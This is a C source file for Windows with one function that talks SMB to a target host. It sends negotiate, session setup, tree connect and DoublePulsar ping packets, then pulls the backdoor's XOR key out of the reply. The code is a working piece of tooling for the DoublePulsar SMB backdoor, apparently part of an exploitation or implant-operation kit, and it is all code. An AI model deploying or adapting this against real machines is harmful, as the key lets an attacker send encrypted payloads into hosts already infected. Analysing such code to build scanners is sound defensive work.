#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <limits.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    uint8_t negotiate_packet[sizeof(SMB_NEGOTIATE_PKT)];
    uint8_t session_setup_packet[sizeof(SMB_SESSION_SETUP_PKT)];
    uint8_t tree_connect_packet[sizeof(SMB_TREE_CONNECT_PKT)];
    uint8_t ping_packet[sizeof(DP_PING_PKT)];
    uint8_t response[65536];
    SOCKET socket_handle;
    size_t sent;
    size_t received;
    size_t packet_length;
    int result;
    unsigned int xor_key = 0;

    if (ip == NULL ||
        sizeof(SMB_NEGOTIATE_PKT) <= 1 ||
        sizeof(SMB_SESSION_SETUP_PKT) <= 1 ||
        sizeof(SMB_TREE_CONNECT_PKT) <= 1 ||
        sizeof(DP_PING_PKT) <= 1 ||
        SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4) {
        return 0;
    }

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, sizeof(negotiate_packet));
    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, sizeof(session_setup_packet));
    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, sizeof(tree_connect_packet));
    memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));

    socket_handle = smb_connect(ip, port);
    if (socket_handle == INVALID_SOCKET) {
        return 0;
    }

    sent = 0;
    while (sent < sizeof(negotiate_packet) - 1) {
        size_t remaining = sizeof(negotiate_packet) - 1 - sent;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = send(socket_handle, (const char *)negotiate_packet + sent, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        sent += (size_t)result;
    }

    received = 0;
    while (received < 4) {
        result = recv(socket_handle, (char *)response + received, (int)(4 - received), 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }
    packet_length = ((size_t)response[1] << 16) |
                    ((size_t)response[2] << 8) |
                    (size_t)response[3];
    if (packet_length > sizeof(response) - 4) {
        goto cleanup;
    }
    received = 0;
    while (received < packet_length) {
        size_t remaining = packet_length - received;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = recv(socket_handle, (char *)response + 4 + received, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }

    sent = 0;
    while (sent < sizeof(session_setup_packet) - 1) {
        size_t remaining = sizeof(session_setup_packet) - 1 - sent;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = send(socket_handle, (const char *)session_setup_packet + sent, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        sent += (size_t)result;
    }

    received = 0;
    while (received < 4) {
        result = recv(socket_handle, (char *)response + received, (int)(4 - received), 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }
    packet_length = ((size_t)response[1] << 16) |
                    ((size_t)response[2] << 8) |
                    (size_t)response[3];
    if (packet_length > sizeof(response) - 4) {
        goto cleanup;
    }
    received = 0;
    while (received < packet_length) {
        size_t remaining = packet_length - received;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = recv(socket_handle, (char *)response + 4 + received, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }
    if (packet_length + 4 < 34) {
        goto cleanup;
    }

    tree_connect_packet[32] = response[32];
    tree_connect_packet[33] = response[33];

    sent = 0;
    while (sent < sizeof(tree_connect_packet) - 1) {
        size_t remaining = sizeof(tree_connect_packet) - 1 - sent;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = send(socket_handle, (const char *)tree_connect_packet + sent, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        sent += (size_t)result;
    }

    received = 0;
    while (received < 4) {
        result = recv(socket_handle, (char *)response + received, (int)(4 - received), 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }
    packet_length = ((size_t)response[1] << 16) |
                    ((size_t)response[2] << 8) |
                    (size_t)response[3];
    if (packet_length > sizeof(response) - 4) {
        goto cleanup;
    }
    received = 0;
    while (received < packet_length) {
        size_t remaining = packet_length - received;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = recv(socket_handle, (char *)response + 4 + received, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }
    if (packet_length + 4 < 34) {
        goto cleanup;
    }

    ping_packet[28] = response[28];
    ping_packet[29] = response[29];
    ping_packet[32] = response[32];
    ping_packet[33] = response[33];

    sent = 0;
    while (sent < sizeof(ping_packet) - 1) {
        size_t remaining = sizeof(ping_packet) - 1 - sent;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = send(socket_handle, (const char *)ping_packet + sent, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        sent += (size_t)result;
    }

    received = 0;
    while (received < 4) {
        result = recv(socket_handle, (char *)response + received, (int)(4 - received), 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }
    packet_length = ((size_t)response[1] << 16) |
                    ((size_t)response[2] << 8) |
                    (size_t)response[3];
    if (packet_length > sizeof(response) - 4) {
        goto cleanup;
    }
    received = 0;
    while (received < packet_length) {
        size_t remaining = packet_length - received;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        result = recv(socket_handle, (char *)response + 4 + received, chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            goto cleanup;
        }
        received += (size_t)result;
    }

    if (SMB_RESP_SIGNATURE_END > packet_length + 4) {
        goto cleanup;
    }

    xor_key = (unsigned int)response[SMB_RESP_SIGNATURE_START] |
              ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
              ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
              ((unsigned int)response[SMB_RESP_SIGNATURE_START + 3] << 24);

cleanup:
    closesocket(socket_handle);
    return xor_key;
}